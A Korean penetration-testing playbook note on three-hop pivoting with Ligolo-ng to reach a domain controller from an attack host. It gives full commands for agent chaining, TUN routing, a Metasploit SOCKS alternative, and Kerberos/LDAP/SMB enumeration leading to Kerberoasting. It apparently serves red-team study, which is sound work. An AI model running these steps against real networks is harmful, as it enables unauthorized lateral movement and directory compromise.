---
tags:
  - 환경/linux
  - 환경/windows
  - 환경/ad
  - 기능/피벗
시작상태:
  - Linux 피벗 셸과 두 Windows 중간 세션 확보
  - DC가 마지막 Windows 호스트에서만 연결됨
목표:
  - Linux 공격 호스트에서 최종 내부망 접근
  - DC의 Kerberos LDAP SMB 서비스 열거
필요권한:
  - Linux 피벗 호스트 명령 실행 권한
  - 두 Windows 중간 호스트 명령 실행 세션
필요정보:
  - 각 홉에서 다음 홉으로 연결 가능한 IP와 포트
  - 마지막 Windows 호스트에서 보이는 내부망 CIDR과 DC IP
네트워크위치:
  - Linux 공격 호스트에서 Linux 피벗과 두 Windows 호스트를 거쳐 DC에 도달
---

# 3홉 피벗팅으로 DC 열거

## 시나리오 개요

`Linux 공격 호스트 -> Linux 피벗 -> Windows1 -> Windows2 -> DC` 구조에서 DC가 Windows2에서만 보일 때 각 홉의 도달성을 확인하고 Ligolo-ng 세션을 연쇄 연결하여 공격 호스트의 AD 도구가 DC에 직접 연결되게 만든다.

## 기준 구조

```text
Linux 공격 호스트
  -> Linux 피벗
    -> Windows1
      -> Windows2
        -> DC 또는 최종 내부망
```

| DC 연결 성공 위치 | 필요한 경로 | 선택 |
|---|---|---|
| Linux 피벗 | 1홉 | 기존 터널 또는 [[SSH 포트 포워딩 피벗팅]] |
| Windows1 | 2홉 | [[ligolo-ng]] 또는 [[Chisel SOCKS 터널링]] |
| Windows2 | 3홉 | Ligolo-ng listener 연쇄 연결 우선 |
| 어느 호스트에서도 실패 | 피벗 이전 문제 | DC IP·route·방화벽·서비스 상태 재확인 |

## 시작 상태

| 확인할 것 | 필요한 상태 | 확인 방법 | 미충족 시 다음 확인 |
|---|---|---|---|
| Linux 공격 호스트에서 Linux 피벗 연결 | agent가 proxy 포트에 연결 가능 | `nc -vz <ATTACK_IP> 11601` | listener 주소와 방화벽 확인 |
| Windows1에서 Linux 피벗 연결 | relay 포트 접근 가능 | `Test-NetConnection <LINUX_PIVOT_IP> -Port 4444` | Windows1 route와 Linux listener 확인 |
| Windows2에서 Windows1 연결 | relay 포트 접근 가능 | `Test-NetConnection <WINDOWS1_IP> -Port 4445` | Windows2 route와 Windows1 listener 확인 |
| Windows2에서 DC 연결 | 88·389·445 중 필요한 서비스 연결 | `Test-NetConnection <DC_IP> -Port 445` | DC 주소와 Windows2 route 확인 |

## 공격 경로 요약

| 단계 | 실행 위치 | 수행할 행동 | 확인할 출력·상태 | 다음 단계 |
|---|---|---|---|---|
| 1 | 각 피벗 호스트 | DC 포트 도달성 비교 | DC에 연결되는 가장 앞선 위치 | 필요한 홉 수 확정 |
| 2 | Linux 공격 호스트와 Linux 피벗 | Ligolo proxy·첫 agent 연결 | Linux agent 세션 | Windows1용 listener 생성 |
| 3 | Windows1 | 두 번째 agent 연결 | Windows1 agent 세션 | Windows2용 listener 생성 |
| 4 | Windows2 | 세 번째 agent 연결 | Windows2 agent 세션 | 최종 CIDR route 추가 |
| 5 | Linux 공격 호스트 | DC TCP 연결과 서비스 열거 | 88·389·445 응답과 도메인 단서 | 인증 후 AD 열거 |

## 1. 각 홉에서 DC 도달성 비교

Linux 피벗에서 DC의 핵심 TCP 포트를 확인한다.

```bash
ip -br addr
ip route
nc -zvw1 <DC_IP> 88
nc -zvw1 <DC_IP> 389
nc -zvw1 <DC_IP> 445
```

Windows1과 Windows2에서 같은 대상·포트를 비교한다.

```powershell
ipconfig /all
route print -4
Test-NetConnection <DC_IP> -Port 88
Test-NetConnection <DC_IP> -Port 389
Test-NetConnection <DC_IP> -Port 445
```

Windows2에서만 `TcpTestSucceeded : True`가 나오면 3홉 경로가 필요하다. 어느 홉에서도 연결되지 않으면 터널을 만들기 전에 DC IP와 최종 내부망 route를 다시 확인한다.

## 2. 공격 호스트와 Linux 피벗 연결

Linux 공격 호스트에서 Ligolo-ng proxy용 TUN 인터페이스를 만들고 proxy를 실행한다.

```bash
sudo ip tuntap add user $(whoami) mode tun ligolo
sudo ip link set ligolo up
./proxy -selfcert
```

Linux 피벗에서 첫 agent를 연결한다.

```bash
./agent -connect <ATTACK_IP>:11601 -ignore-cert
```

proxy 콘솔에서 Linux 피벗 세션을 선택하고 Windows1이 연결할 listener를 만든다.

```text
session
listener_add --addr 0.0.0.0:4444 --to 127.0.0.1:11601 --tcp
listener_list
```

확인할 출력:

- proxy 콘솔에 Linux agent가 새 세션으로 표시됨.
- `listener_list`에 `0.0.0.0:4444`가 표시됨.
- Windows1에서 `<LINUX_PIVOT_IP>:4444` 연결이 성공함.

## 3. Windows1과 Windows2 agent 연쇄 연결

Windows1에서 Linux 피벗 listener로 agent를 연결한다.

```powershell
.\agent.exe -connect <LINUX_PIVOT_IP>:4444 -ignore-cert
```

proxy 콘솔에서 새 Windows1 세션을 선택하고 Windows2가 연결할 listener를 만든다.

```text
session
listener_add --addr 0.0.0.0:4445 --to 127.0.0.1:11601 --tcp
listener_list
```

Windows2에서 Windows1 listener로 agent를 연결한다.

```powershell
.\agent.exe -connect <WINDOWS1_IP>:4445 -ignore-cert
```

proxy 콘솔에 Linux 피벗, Windows1, Windows2 세션이 각각 보여야 한다. 세션이 나타나지 않으면 이전 홉에서 listener가 열린 상태와 다음 홉에서 해당 주소·포트로 연결되는지를 먼저 확인한다.

## 4. Windows2의 최종 내부망 route 연결

proxy 콘솔에서 Windows2 세션을 선택하고 최종 내부망 CIDR을 Ligolo 인터페이스에 연결한다.

```text
session
interface_add_route --name ligolo --route <WINDOWS2_DEEP_CIDR>
start
```

사용 중인 Ligolo-ng 버전에서 route 명령을 지원하지 않으면 Linux 공격 호스트에 route를 추가한다.

```bash
sudo ip route add <WINDOWS2_DEEP_CIDR> dev ligolo
ip route get <DC_IP>
```

`ip route get <DC_IP>`가 `dev ligolo`를 가리키는지 확인한다. 기존에 같은 CIDR route가 있으면 덮어쓰지 말고 기존 경로와 metric을 먼저 기록한다.

## 5. 공격 호스트에서 DC 연결과 서비스 열거

Linux 공격 호스트에서 넓은 스캔 전에 단일 TCP 연결을 확인한다.

```bash
nc -vz <DC_IP> 88
nc -vz <DC_IP> 389
nc -vz <DC_IP> 445
```

연결이 되면 TCP connect scan과 서비스별 기본 열거를 진행한다.

```bash
nmap --unprivileged -sT -Pn -n <DC_IP> -p53,88,135,389,445,5985,3389 --open
nxc smb <DC_IP>
ldapsearch -x -H ldap://<DC_IP> -s base namingcontexts defaultNamingContext dnsHostName
```

도메인명과 유효 계정이 있으면 인증 후 사용자와 SPN을 확인한다.

```bash
nxc ldap <DC_IP> -d <DOMAIN> -u <USER> -p '<PASSWORD>' --users
impacket-GetUserSPNs '<DOMAIN>/<USER>:<PASSWORD>' -dc-ip <DC_IP>
```

| 출력 | 새로 확인한 상태 | 다음 행동 |
|---|---|---|
| 88·389·445 TCP 연결 성공 | 공격 호스트에서 DC 서비스에 직접 연결 가능 | 서비스별 열거 계속 |
| RootDSE의 `defaultNamingContext` | 도메인 DN 확인 | [[AD 도메인 컨텍스트 기본 확인]] |
| SMB 호스트명·도메인명 | DC 이름과 도메인 후보 확인 | LDAP·Kerberos 이름 해석 정리 |
| LDAP 인증 성공과 사용자 목록 | 유효 AD 계정과 읽기 권한 확인 | [[인증 후 AD 사용자와 컴퓨터 객체 열거]] |
| SPN 계정 확인 | Kerberoasting 전제 충족 | [[Kerberoasting]] |

## 6. 대안 경로 선택

Ligolo-ng를 사용할 수 없고 끝단에서 SOCKS만 열면 되는 경우 [[Chisel SOCKS 터널링]]을 검토한다. Windows 중간 호스트가 다음 relay를 받아야 하면 [[Windows Netsh Portproxy 포트 포워딩]] 또는 [[socat]]으로 listener를 이어야 하므로 각 홉의 포트와 복구 절차를 별도로 기록한다.

끝단 Windows2에 Meterpreter 세션이 있으면 [[Meterpreter 라우팅과 포트 포워딩]]으로 route와 SOCKS를 구성할 수 있다.

```text
sessions -l
use post/multi/manage/autoroute
set SESSION <SESSION_ID>
set SUBNET <WINDOWS2_DEEP_CIDR>
run
use auxiliary/server/socks_proxy
set SRVHOST 127.0.0.1
set SRVPORT 9050
set VERSION 4a
run -j
```

```bash
proxychains -q nc -vz <DC_IP> 445
proxychains -q nmap -sT -Pn -n <DC_IP> -p88,389,445
```

## 실패 시 분기

| 멈춘 단계·출력 | 가능한 원인 | 확인 명령 | 이어갈 단계 |
|---|---|---|---|
| 다음 agent가 연결되지 않음 | 이전 agent listener 주소·포트에 연결 불가 | `Test-NetConnection <LISTENER_IP> -Port <PORT>` | listener bind 주소와 route 확인 |
| listener는 있지만 proxy에 세션이 없음 | `--to` 포트 또는 proxy listener 불일치 | `listener_list` | proxy 포트와 listener 전달 대상 비교 |
| route 추가 후 DC 연결 실패 | 잘못된 CIDR, 잘못 선택한 세션, 기존 route 충돌 | `ip route get <DC_IP>`, Windows2의 `route print -4` | 최종 CIDR과 Windows2 도달성 재확인 |
| `nc`는 성공하지만 `nmap`만 실패 | SYN scan·권한·timeout 문제 | `nmap --unprivileged -sT -Pn -n ...` | TCP connect scan 사용 |
| IP는 연결되지만 FQDN이 해석되지 않음 | 내부 DNS 경로 미설정 | `nslookup <DC_FQDN> <DC_IP>` | 도구에 DC IP·FQDN을 함께 지정 |
| Kerberos 요청 실패 | DNS, FQDN, realm 또는 시간 차이 | `date`, `nslookup`, 도메인명 확인 | 이름 해석과 시간 동기화 후 재시도 |

## 변경 영향과 복구

| 변경 대상 | 기록할 기존 값 | 예상 영향 | 복구 명령 |
|---|---|---|---|
| Linux 공격 호스트 `ligolo` TUN | 기존 동일 이름 인터페이스와 route | 최종 CIDR 트래픽이 터널로 전달됨 | `sudo ip route del <WINDOWS2_DEEP_CIDR> dev ligolo`; `sudo ip link del ligolo` |
| Ligolo listener | listener ID와 포트 | 중간 호스트에서 TCP listener가 열림 | proxy 콘솔에서 해당 listener 삭제 또는 세션 종료 |
| Metasploit SOCKS job | job ID와 route | 로컬 SOCKS 포트와 Metasploit route 유지 | `jobs -k <JOB_ID>` 후 등록 route 제거 |
| Windows portproxy를 대안으로 사용한 경우 | 기존 portproxy·방화벽 규칙 | 중간 Windows 호스트에 listener와 방화벽 예외 생성 | 해당 기법 문서의 delete 명령으로 portproxy와 방화벽 규칙 제거 |

## 완료 기준

- Linux 공격 호스트의 `ip route get <DC_IP>`가 의도한 터널 인터페이스를 가리킴.
- 공격 호스트에서 DC의 88·389·445 중 필요한 포트에 TCP 연결됨.
- SMB 또는 LDAP 출력으로 DC 호스트명·도메인명·도메인 DN을 확인함.
- 유효 AD 계정이 있으면 LDAP 사용자·SPN 열거가 실행됨.
- 피벗 경로 자체를 다시 선택해야 하면 [[내부망 경로 확보 후 피벗 구성]], DC 서비스가 보이면 관련 서비스·공격기법으로 이동함.

## 관련 노트

- [[내부망 경로 확보 후 피벗 구성]]
- [[피벗팅 경로 식별과 내부망 열거]]
- [[ligolo-ng]]
- [[Chisel SOCKS 터널링]]
- [[proxychains]]
- [[socat]]
- [[Windows Netsh Portproxy 포트 포워딩]]
- [[Meterpreter 라우팅과 포트 포워딩]]
- [[SSH 포트 포워딩 피벗팅]]
- [[389_636_LDAP]]
- [[445_SMB]]
- [[88_Kerberos]]
- [[Kerberoasting]]
